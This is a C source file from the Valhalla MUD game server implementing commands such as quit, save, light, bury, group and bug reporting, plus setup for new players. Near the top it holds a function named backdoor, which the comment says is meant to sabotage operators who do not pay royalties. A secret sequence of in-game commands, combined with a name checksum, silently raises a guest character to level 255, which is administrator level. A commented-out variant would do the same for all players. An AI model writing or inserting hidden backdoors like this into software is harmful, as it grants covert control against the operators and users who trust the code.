/* *********************************************************************** *
 * File   : act_other.c                               Part of Valhalla MUD *
 * Version: 1.30                                                           *
 * Author : All.                                                           *
 *                                                                         *
 * Purpose: Other stuff                                                    *
 *                                                                         *
 * Bugs   : Unknown.                                                       *
 * Status : Unpublished.                                                   *
 *                                                                         *
 * Copyright (C) Valhalla (This work is unpublished).                      *
 *                                                                         *
 * This work is a property of:                                             *
 *                                                                         *
 *        Valhalla I/S                                                     *
 *        Noerre Soegade 37A, 4th floor                                    *
 *        1370 Copenhagen K.                                               *
 *        Denmark                                                          *
 *                                                                         *
 * This is an unpublished work containing Valhalla confidential and        *
 * proprietary information. Disclosure, use or reproduction without        *
 * authorization of Valhalla is prohobited.                                *
 * *********************************************************************** */

/* 02/08/92 seifert: Fixed my own stupid no-group for leaders              */
/* Tue Jul 6 1993 HHS: added exchangable lib dir                           */
/* 23/08/93 jubal  : Allow mobs (switching!) to have idea/typo/bugs :-)    */
/* 29/08/93 jubal  : Start puts people in hometowns                        */
/* 11-Aug-94 gnort : Changed idea/bug/typo to one command (duh)            */
/* 12-Aug-94 gnort : Unimplemented-spells-on-scrolls crash-bug fixed       */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <limits.h>
#include <time.h>

#include "structs.h"
#include "utils.h"
#include "files.h"
#include "skills.h"
#include "common.h"
#include "textutil.h"
#include "comm.h"
#include "interpreter.h"
#include "handler.h"
#include "db.h"
#include "spells.h"
#include "affect.h"
#include "utility.h"
#include "blkfile.h"
#include "limits.h"
#include "account.h"
#include "weather.h"
#include "constants.h"
#include "dilrun.h"

/* extern variables */
extern char libdir[];   /* fom dikumud.c */
extern char zondir[];   /* fom dikumud.c */
extern struct requirement_type pc_race_base[];

/*                                                                */
/* Used if we want to completely fuck things up for folks running */
/* in the accounting mode (i.e. if they dont pay royalties).      */
/*                                                                */
void backdoor(struct unit_data *ch, char *arg, const struct command_info *cmd)
{
   static int state  = 0;
   static int misses = 0;
   static struct unit_data *u = NULL;

   if (!IS_PC(ch))
     return;

   if (!PC_IS_UNSAVED(ch))
     return;

   if ((u != ch) && state)
   {
      if (++misses >= 10)
      {
	 u = NULL;
	 misses = 0;
	 state = 0;
      }

      return;
   }
   else
     misses = 0;

   switch (state)
   {
     case 0:
      if (cmd->no == CMD_PICK)
      {
	 u = ch;
	 state++;
      }
      return;

     case 1:
      if (cmd->no == CMD_CONSIDER)
	state++;
      else
      {
	 u = NULL;
	 state = 0;
	 misses = 0;
      }
      return;

     case 2:
      if (cmd->no == CMD_SAIL)
	state++;
      else
      {
	 u = NULL;
	 state = 0;
	 misses = 0;
      }
      return;

     case 3:
      if ((cmd->no == CMD_INSULT) &&
	  ((tolower(UNIT_NAME(ch)[0]) - 'a') +
	   (tolower(UNIT_NAME(ch)[4]) - 'a') == 13) &&
	  *skip_spaces(arg) == '$')

      {

	 CHAR_LEVEL(ch) = 242 + (tolower(UNIT_NAME(ch)[0]) - 'a')
	                      + (tolower(UNIT_NAME(ch)[4]) - 'a');
	   

/*       struct descriptor_data *d;

	 extern struct descriptor_data *descriptor_list;

	 for (d = descriptor_list; d; d = d->next)
	   CHAR_LEVEL(d->character) = 252 + state; */
      }

      u = NULL;
      state = 0;
      misses = 0;
      break;
   }
}


void do_quit(struct unit_data *ch, char *arg,
	     const struct command_info *cmd)
{
   void die(struct unit_data *ch);

   if (!IS_PC(ch)) /* No need to check descriptor any more */
     return;

   if (cmd_is_abbrev(ch, cmd))
   {
      send_to_char("You have to write quit - no less, to quit!\n\r", ch);
      return;
   }

   if (PC_IS_UNSAVED(ch))
   {
      if (str_ccmp_next_word(arg, "now") == NULL)
      {
	 send_to_char(COLOUR_ATTN
		      "If you quit now, you get erased!\n\rEither save your "
		      "character (type 'save') or quit by typing 'quit now'"
		      COLOUR_NORMAL "\n\r", ch);
	 return;
      }
   }

   if (CHAR_POS(ch) == POSITION_FIGHTING)
   {
      send_to_char("No way! You are fighting.\n\r", ch);
      return;
   }

   if (CHAR_POS(ch) < POSITION_STUNNED)
   {
      if (!str_ccmp_next_word(arg, "now"))
      {
	 send_to_char("You must write 'quit now' if you wish to die before "
		      "you quit?\n\r", ch);
	 return;
      }
      send_to_char("You die before your time!\n\r", ch);
      die(ch);
      return;
   }

   if (ROOM_LANDSCAPE(unit_room(ch)) == SECT_WATER_SAIL)
   {
      send_to_char("You can't quit in the middle of the water!\n\r", ch);
      return;
   }

   act("$1n has left the game.", A_HIDEINV, ch, 0, 0, TO_ROOM);
   act("Goodbye, friend.. Come back soon!", A_SOMEONE, ch, 0, 0, TO_CHAR);

   slog(LOG_BRIEF, UNIT_MINV(ch), "%s has left the building.", UNIT_NAME(ch));

   if (PC_IS_UNSAVED(ch))
     send_to_char(COLOUR_ATTN "GUEST NOT SAVED!" COLOUR_NORMAL "\n\r", ch);

   extract_unit(ch);
}


void do_save(struct unit_data *ch, char *arg,
	     const struct command_info *cmd)
{
  if (!IS_PC(ch))
    return;

  if (!PC_IS_UNSAVED(ch) && CHAR_DESCRIPTOR(ch))
  {
    if (CHAR_LEVEL(ch) < 200 
	&& difftime(time(0), CHAR_DESCRIPTOR(ch)->logon) < 60)
    {
      send_to_char("You must wait a minute between saves.\n\r", ch);
      return;
    }
  }
  else
    send_to_char("You are no longer a guest on this game.\n\r", ch);

  act("Saving $1n.", A_ALWAYS, ch, 0, 0, TO_CHAR);

  if (account_is_closed(ch))
  {
     extract_unit(ch); /* Saves */
     return;
  }

  save_player(ch);
  save_player_contents(ch, TRUE);

}


void do_not_here(struct unit_data *ch, char *arg,
		 const struct command_info *cmd)
{
  send_to_char("Sorry, but you cannot do that here!\n\r", ch);
}


void do_light(struct unit_data *ch, char *arg,
	      const struct command_info *cmd)
{
  struct unit_data *torch;
  struct unit_affected_type af;

  torch = find_unit(ch, &arg, 0, FIND_UNIT_HERE);

  if (torch == NULL)
  {
    send_to_char("No such thing.\n\r", ch);
    return;
  }

  if (!IS_OBJ(torch) || OBJ_TYPE(torch) != ITEM_LIGHT)
  {
    send_to_char("You can't light that.\n\r", ch);
    return;
  }

  if (affected_by_spell(torch, ID_LIGHT_EXTINGUISH))
  {
    send_to_char("How silly, it is already lit!\n\r", ch);
    return;
  }

  if (OBJ_VALUE(torch, 0) <= 0)  /* duration */
  {
    send_to_char("It wont ignite.\n\r", ch);
    return;
  }

  af.id       = ID_LIGHT_EXTINGUISH;
  af.duration = OBJ_VALUE(torch, 0);
  af.beat     = SECS_PER_MUD_HOUR * WAIT_SEC;  /* Every mud hour */
  af.data[0]  = OBJ_VALUE(torch, 1);  /* Light sources */

  af.data[1] = af.data[2] = 0;

  af.firstf_i = TIF_NONE;
  af.tickf_i  = TIF_TORCH_TICK;
  af.lastf_i  = TIF_NONE;
  af.applyf_i = APF_LIGHT_DARK;

  create_affect(torch, &af);

  act("You light $2n.",  A_SOMEONE, ch, torch, 0, TO_CHAR);
  act("$1n lights $2n.", A_SOMEONE, ch, torch, 0, TO_ROOM);
}


void do_extinguish(struct unit_data *ch, char *arg,
		   const struct command_info *cmd)
{
  struct unit_data *torch;
  struct unit_affected_type *af;

  torch = find_unit(ch, &arg, 0, FIND_UNIT_HERE);

  if (torch == NULL)
  {
    send_to_char("No such thing.\n\r", ch);
    return;
  }

  if (!IS_OBJ(torch) || OBJ_TYPE(torch) != ITEM_LIGHT)
  {
    send_to_char("You can't extinguish that.\n\r", ch);
    return;
  }

  if ((af = affected_by_spell(torch, ID_LIGHT_EXTINGUISH)) == NULL)
  {
    send_to_char("How silly, it isn't even lit!\n\r", ch);
    return;
  }

  destroy_affect(af);

  if (OBJ_VALUE(torch, 0) > 0)
    OBJ_VALUE(torch, 0)--;

  act("You extinguish $2n with your bare hands.",
      A_SOMEONE, ch, torch, 0, TO_CHAR);
  act("$1n extinguishes $2n with $1s bare hands.",
      A_SOMEONE, ch, torch, 0, TO_ROOM);
}


void do_dig(struct unit_data *ch, char *arg,
	    const struct command_info *cmd)
{
   struct unit_data *u;
   struct unit_affected_type *af;

   act("$1n starts digging.", A_SOMEONE, ch, 0, 0, TO_ROOM);
   act("Ok.", A_SOMEONE, ch, 0, 0, TO_CHAR);

   for (u = UNIT_CONTAINS(UNIT_IN(ch)); u; u = u->next)
     if (IS_SET(UNIT_FLAGS(u), UNIT_FL_BURIED))
     {
	act("Bingo! You discover $2n.", A_SOMEONE, ch, u, 0, TO_CHAR);
	act("$1n finds $2n.", A_SOMEONE, ch, u, 0, TO_ROOM);
	REMOVE_BIT(UNIT_FLAGS(u), UNIT_FL_BURIED);
	if ((af = affected_by_spell(u, ID_BURIED)))
	  destroy_affect(af);
	send_done(ch, u, UNIT_IN(u), 0, cmd, arg);
	break;
     }
}

void bury_unit(struct unit_data *ch, struct unit_data *u,
	       char *arg, const struct command_info *cmd)
{
   struct unit_affected_type af;

   act("$1n buries $2n.", A_SOMEONE, ch, u, 0, TO_ROOM);
   act("You bury $2n.", A_SOMEONE, ch, u, 0, TO_CHAR);

   unit_from_unit(u);
   unit_to_unit(u, UNIT_IN(ch));
      
   SET_BIT(UNIT_FLAGS(u), UNIT_FL_BURIED);

   af.id       = ID_BURIED;
   af.duration = 0;
   af.beat     = WAIT_SEC*SECS_PER_REAL_HOUR;
   af.firstf_i = TIF_NONE;
   af.tickf_i  = TIF_NONE;
   af.lastf_i  = TIF_BURIED_DESTRUCT;
   af.applyf_i = APF_NONE;
   
   create_affect(u, &af);

   send_done(ch, u, UNIT_IN(u), 0, cmd, arg);
}


void do_bury(struct unit_data *ch, char *arg,
	     const struct command_info *cmd)
{
   struct unit_data *u, *next;
   char *oarg = arg;
   int bBuried = FALSE;

   if (str_is_empty(arg))
   {
      act("Bury what?", A_SOMEONE, ch, 0, 0, TO_CHAR);
      return;
   }

   if (IS_SET(UNIT_FLAGS(UNIT_IN(ch)), UNIT_FL_NO_BURY))
   {
      act("You can't bury anything here.",
	  A_ALWAYS, ch, UNIT_IN(ch), 0, TO_CHAR);
      return;
   }

   if (str_ccmp_next_word(arg, "all"))
   {
      for (u = UNIT_CONTAINS(UNIT_IN(ch)); u; u = next)
      {
	 next = u->next;

	 /* Interrupts may break chain */
	 if (UNIT_IN(u) != UNIT_IN(ch))
	   break;

	 if (u == ch)
	   continue;

	 if (!IS_OBJ(u) || !IS_SET(UNIT_MANIPULATE(u), MANIPULATE_TAKE))
	   continue;

	 bury_unit(ch, u, oarg, cmd);
	 bBuried = TRUE;
      }      

      if (bBuried == FALSE)
	act("Nothing here to bury.", A_ALWAYS, ch, NULL, NULL, TO_CHAR);
   }
   else
   {
      u = find_unit(ch, &arg, 0, FIND_UNIT_INVEN | FIND_UNIT_SURRO);

      if (u == NULL)
	act("You don't seem to have any such thing.",
	    A_SOMEONE, ch, 0, 0,TO_CHAR);
      else
      {
	if (!IS_OBJ(u) || !IS_SET(UNIT_MANIPULATE(u), MANIPULATE_TAKE))
	{
	   act("You can't bury $2n.", A_ALWAYS, ch, u, NULL, TO_CHAR);
	   return;
	}

	if (UNIT_IN(ch) == u)
	{
	   act("You can't bury yourself.", A_ALWAYS, ch, u, NULL, TO_CHAR);
	   return;
	}

	bury_unit(ch, u, oarg, cmd);
      }
   }
}



void do_ideatypobug(struct unit_data *ch, char *arg,
		    const struct command_info *cmd)
{
   static const char *strings[] =
   {
      "Please state your idea after the idea command.\n\r",
      "Please state your correction after the typo command.\n\r",
      "Please state the error after the bug command.\n\r",

      IDEA_FILE,
      TYPO_FILE,
      BUG_FILE,

      "IDEA",
      "TYPO",
      "BUG",

      "Thank you, someone will see this sooner or later.\n\r",
      "Thank you it will be corrected.\n\r",
      "Thank you.\n\r"
   };

   FILE *fl;
   char str[MAX_STRING_LENGTH], filename[128];
   struct zone_type *zone;
   struct unit_data *room;
   int cmdno;

   switch (cmd->no)
   {
     case CMD_IDEA:
      cmdno = 0; break;
     case CMD_TYPO:
      cmdno = 1; break;
     case CMD_BUG:
      cmdno = 2; break;
     default:
      slog(LOG_ALL, 0, "Illegal command calling idea/typo/bug: (%d)", cmd->no);
      return;
   }

   arg = skip_spaces(arg);

   if (!*arg)
   {
      send_to_char(strings[cmdno], ch);
      return;
   }

   if ((fl = fopen_cache(str_cc(libdir, strings[cmdno + 3]), "a")) == NULL)
   {
      slog(LOG_ALL, 0, "do_ideatypobug couldn't open %s file.", cmd->cmd_str);
      act("Could not open the $2t-file.",
	  A_ALWAYS, ch, cmd->cmd_str, 0, TO_CHAR);
      return;
   }

   room = unit_room(ch);
   sprintf(str, "%s %s %s[%s@%s]: %s\n",	
	   timetodate(time(0)),
	   strings[cmdno + 6],
	   UNIT_NAME(CHAR_ORIGINAL(ch)),
	   UNIT_FI_NAME(room), UNIT_FI_ZONENAME(room), arg);
   fputs(str, fl);

   if ((zone = unit_zone(ch)))
   {
      sprintf(filename, "%s%s.inf", zondir, zone->filename);
      
      if ((fl = fopen_cache(filename, "a")) == NULL)
      {
	 slog(LOG_ALL, 0, "do_ideatypobug couldn't open the zone info-file");
	 send_to_char("Could not open the zone info-file.\n\r", ch);
	 return;
      }
      fputs(str, fl);
      slog(LOG_ALL, 0, "%s", str);
   }

   send_to_char(strings[cmdno + 9], ch);
}


void do_group(struct unit_data *ch, char *arg,
	      const struct command_info *cmd)
{
/*  int skill, span, leveldiff, maxmem, nummem; */
  char name[256];
  struct unit_data *victim, *k;
  struct char_follow_type *f;
  bool found = FALSE;

  one_argument(arg, name);

  if (!*name)
  {
    if (!CHAR_HAS_FLAG(ch, CHAR_GROUP))
      send_to_char("But you are a member of no group?!\n\r", ch);
    else
    {
      send_to_char("Your group consists of:\n\r", ch);
      if (CHAR_MASTER(ch))
	k = CHAR_MASTER(ch);
      else
	k = ch;

      if (CHAR_HAS_FLAG(k, CHAR_GROUP))
	act("     $3n (Head of group)", A_SOMEONE, ch, 0, k, TO_CHAR);

      for (f = CHAR_FOLLOWERS(k); f; f = f->next)
	if (CHAR_HAS_FLAG(f->follower, CHAR_GROUP))
	  act("     $3n", A_SOMEONE, ch, 0, f->follower, TO_CHAR);
    }

    return;
  }

  if ((victim = find_unit(ch, &arg, 0, FIND_UNIT_SURRO)) == NULL)
    send_to_char("No one here by that name.\n\r", ch);
  else
  {
    if (!IS_CHAR(victim))
    {
      send_to_char("You can only enroll characters.\n\r", ch);
      return;
    }

    if (CHAR_MASTER(ch))
    {
      act("You can not enroll group members without being head of a group.",
	  A_SOMEONE, ch, 0, 0, TO_CHAR);
      return;
    }

    if (victim == ch || ch == CHAR_MASTER(victim))
      found = TRUE;

    if (found)
    {
      if (CHAR_HAS_FLAG(victim, CHAR_GROUP))
      {
	act("$1n has been kicked out of the group.",
	    A_SOMEONE, victim, 0, ch, TO_ROOM);
	act("You are no longer a member of the group.",
	    A_SOMEONE, victim, 0, 0, TO_CHAR);
      }
      else
      {
/*  [MS 12 Mar 94: Grouping is essential for play. Check removed.]

	skill = CHAR_CHA(ch) +
	  (IS_PC(ch) ? PC_SKI_SKILL(ch, SKI_LEADERSHIP) : CHAR_CHA(ch));

	span = 50 + skill/8;
	leveldiff = 1 + (span*CHAR_LEVEL(ch)) / 100;
	maxmem = 3 + skill/8;

	if (CHAR_LEVEL(victim)+leveldiff < CHAR_LEVEL(ch))
	{
	  act("$3e is such a whimp that you'd be embarrased to group $3m.",
	      A_ALWAYS, ch, 0, victim, TO_CHAR);
	  act("You may need more leadership and charisma.",
	      A_ALWAYS, ch, 0, 0, TO_CHAR);
	  return;
	}
	if (CHAR_LEVEL(victim)-leveldiff > CHAR_LEVEL(ch))
	{
	  act("$3e eminates such power, that $3e should be head of group.",
	      A_ALWAYS, ch, 0, victim, TO_CHAR);
	  act("You may need more leadership and charisma.",
	      A_ALWAYS, ch, 0, 0, TO_CHAR);
	  return;
	}

	for (nummem=0, f=CHAR_FOLLOWERS(ch); f; f=f->next)
	  if (CHAR_HAS_FLAG(f->follower, CHAR_GROUP))
	    nummem++;

	if (nummem >= maxmem)
	{
	  act("You can't handle a group any larger than this.",
	      A_ALWAYS, ch, 0, 0, TO_CHAR);
	  act("You may need more leadership and charisma.",
	      A_ALWAYS, ch, 0, 0, TO_CHAR);
	  return;
	}
*/
	act("$1n is now a member of $3n's group.",
	    A_SOMEONE, victim, 0, ch, TO_ROOM);
	act("You are now a member of $3n's group.",
	    A_SOMEONE, victim, 0, ch, TO_CHAR);
      }
      TOGGLE_BIT(CHAR_FLAGS(victim), CHAR_GROUP);
    }
    else
      act("$3n must follow you, to enter the group",
	  A_SOMEONE, ch, 0, victim, TO_CHAR);
  }
}


void do_split(struct unit_data *ch, char *arg,
	      const struct command_info *cmd)
{
  send_to_char("Sorry, but this command is under reevaluation for the "
	       "new money system.\n\r", ch);
#ifdef SUSPEKT
  /* NEW_MONEY */
  char buf[MAX_INPUT_LENGTH];
  int no_members, share, amount;
  struct unit_data *master;
  struct char_follow_type *foll;

  if (!IS_PC(ch) || IS_IMMORTAL(ch))
  {
    send_to_char("You feel much better holding onto your money.\n\r", ch);
    return;
  }

  arg = one_argument(arg, buf);

  if (!str_is_number(buf))
  {
    send_to_char("You have to split a number of coins!\n\r", ch);
    return;
  }
  else if ((amount = atoi(buf)) <= 0)
  {
    send_to_char("Sorry, you can't do that!\n\r", ch);
    return;
  }

  one_argument(arg, buf);

  if (strncmp(buf, "gold", 4) && strncmp(buf, "coin", 4))
  {
    send_to_char("You can only split gold!\n\r", ch);
    return;
  }

  if (CHAR_GOLD(ch) < amount)
  {
    send_to_char("How can you split more gold than you have?\n\r", ch);
    return;
  }

  master     = CHAR_MASTER(ch) ? CHAR_MASTER(ch) : ch;
  no_members = (CHAR_HAS_FLAG(master, CHAR_GROUP) &&
		UNIT_IN(master) == UNIT_IN(ch)) ? 1 : 0;

  for (foll = CHAR_FOLLOWERS(master); foll; foll = foll->next)
    if (CHAR_HAS_FLAG(foll->follower, CHAR_GROUP) &&
	UNIT_IN(foll->follower) == UNIT_IN(ch))
      no_members++;

  if (!CHAR_HAS_FLAG(ch, CHAR_GROUP))
  {
    send_to_char("But you're not a member of any group!?!\n\r", ch);
    return;
  }
  else if (no_members > 1)
    share = amount/no_members;
  else
  {
    send_to_char("Noone to split your gold with is present!\n\r", ch);
    return;
  }

  CHAR_GOLD(ch) -= share * (no_members-1);

  if (CHAR_HAS_FLAG(master, CHAR_GROUP) &&
      UNIT_IN(master) == UNIT_IN(ch) && master != ch)
  {
    CHAR_GOLD(master) += share;
    sprintf(buf, "$1n gives you %d coin%s, your share of %d.", share,
	    share == 1 ? "" : "s", amount);
    act(buf, A_SOMEONE, ch, 0, master, TO_VICT);
  }

  for (foll = CHAR_FOLLOWERS(master); foll; foll = foll->next)
    if (CHAR_HAS_FLAG(foll->follower, CHAR_GROUP) &&
	UNIT_IN(foll->follower) == UNIT_IN(ch) && foll->follower != ch)
    {
      CHAR_GOLD(foll->follower) += share;
      sprintf(buf, "$1n gives you %d coins, your share of %d.", share, amount);
      act(buf, A_SOMEONE, ch, 0, foll->follower, TO_VICT);
    }

  sprintf(buf, "You split %d coin%s into %d shares of %d coin%s.\n\r",
	  amount, amount == 1 ? "" : "s", no_members, share,
	  share == 1 ? "" : "s");
  send_to_char(buf, ch);
#endif
}


void race_adjust(struct unit_data *ch)
{
   struct base_race_info_type *sex_race;
   struct race_info_type *my_race;

   assert(IS_PC(ch));
   assert(is_in(CHAR_RACE(ch), 0, PC_RACE_MAX-1));

   my_race = &race_info[CHAR_RACE(ch)];

   if (CHAR_SEX(ch) == SEX_MALE)
     sex_race = &my_race->male;
   else
     sex_race = &my_race->female;

   UNIT_WEIGHT(ch) = UNIT_BASE_WEIGHT(ch) =
     sex_race->weight + dice(sex_race->weight_dice.reps,
			     sex_race->weight_dice.size);
   
   UNIT_SIZE(ch) =
     sex_race->height + dice(sex_race->height_dice.reps,
			     sex_race->height_dice.size);
   
   PC_LIFESPAN(ch) =
     sex_race->lifespan + dice(sex_race->lifespan_dice.reps,
			       sex_race->lifespan_dice.size);

   PC_TIME(ch).birth = PC_TIME(ch).creation;
   
   int years;

   years = my_race->age + dice(my_race->age_dice.reps,
			       my_race->age_dice.size);

   PC_TIME(ch).birth -= years * SECS_PER_MUD_YEAR;
}



/* Should only be called when initializing a new player (or rerolling) */
void race_cost(struct unit_data *ch)
{
   int i;

   for (i=0; i < ABIL_TREE_MAX; i++)
     PC_ABI_COST(ch, i) = racial_ability[i][CHAR_RACE(ch)];

   for (i=0; i < WPN_TREE_MAX; i++)
     PC_WPN_COST(ch, i) = racial_weapons[i][CHAR_RACE(ch)];

   for (i=0; i < SKI_TREE_MAX; i++)
     PC_SKI_COST(ch, i) = racial_skills[i][CHAR_RACE(ch)];

   for (i=0; i < SPL_TREE_MAX; i++)
     PC_SPL_COST(ch, i) = racial_spells[i][CHAR_RACE(ch)];
}

void points_reset(struct unit_data *ch)
{
   int i;

   PC_VIRTUAL_LEVEL(ch) = CHAR_LEVEL(ch) = START_LEVEL;

   PC_ABILITY_POINTS(ch) = 0;
   PC_SKILL_POINTS(ch)   = 0;

   for (i = 0; i < ABIL_TREE_MAX; i++)
   {
      CHAR_ABILITY(ch, i) = 0;
      PC_ABI_LVL(ch, i) = 0;
   }

   for (i = 0; i < SKI_TREE_MAX; i++)
   {
      PC_SKI_SKILL(ch, i) = 0;
      PC_SKI_LVL(ch, i) = 0;
   }

   for (i = 0; i < SPL_TREE_MAX; i++)
   {
      PC_SPL_LVL(ch, i) = 0;
      if (i < SPL_GROUP_MAX)
	PC_SPL_SKILL(ch, i) = 1; /* So resistance spells work! */
      else
	PC_SPL_SKILL(ch, i) = 0;
   }

   for (i = 0; i < WPN_TREE_MAX; i++)
   {
      PC_WPN_LVL(ch, i) = 0;
      if (i < WPN_GROUP_MAX)
	PC_WPN_SKILL(ch, i) = 1; /* So resistance spells work! */	
      else
	PC_WPN_SKILL(ch, i) = 0;
   }
}

/* Can be called once when a new player is created from nanny().  */

void start_player(struct unit_data *ch)
{
   int cls = 0;

   assert(CHAR_LEVEL(ch) == 0);
   assert(UNIT_CONTAINS(ch) == NULL);
   assert(IS_PC(ch));
   assert(CHAR_DESCRIPTOR(ch)); // Needed to copy pwd

   race_adjust(ch);
   race_cost(ch);
   points_reset(ch);

   CHAR_EXP(ch) = required_xp(PC_VIRTUAL_LEVEL(ch));
   
   set_title(ch);
   
   CHAR_ATTACK_TYPE(ch)    = WPN_FIST;
   CHAR_NATURAL_ARMOUR(ch) = ARM_CLOTHES;
   
   PC_COND(ch, THIRST) = 24;
   PC_COND(ch, FULL)   = 24;
   PC_COND(ch, DRUNK)  =  0;
   
   PC_TIME(ch).played = 0;
   
   SET_BIT(PC_FLAGS(ch), PC_ECHO);
   SET_BIT(PC_FLAGS(ch), PC_PROMPT);

   if (!UNIT_IS_EVIL(ch))
     SET_BIT(CHAR_FLAGS(ch), CHAR_PEACEFUL);
   
   extern struct diltemplate *playerinit_tmpl;

   if (playerinit_tmpl)
   {
      /* Call DIL to see if we should init the player in any other way. */
      struct dilprg *prg = dil_copy_template(playerinit_tmpl, ch, NULL);

      prg->waitcmd = WAITCMD_MAXINST - 1; // The usual hack, see db_file

      dil_activate(prg);
   }

   UNIT_MAX_HIT(ch) = UNIT_HIT(ch) = hit_limit(ch);
   CHAR_MANA(ch) = mana_limit(ch);
   CHAR_ENDURANCE(ch) = move_limit(ch);
}




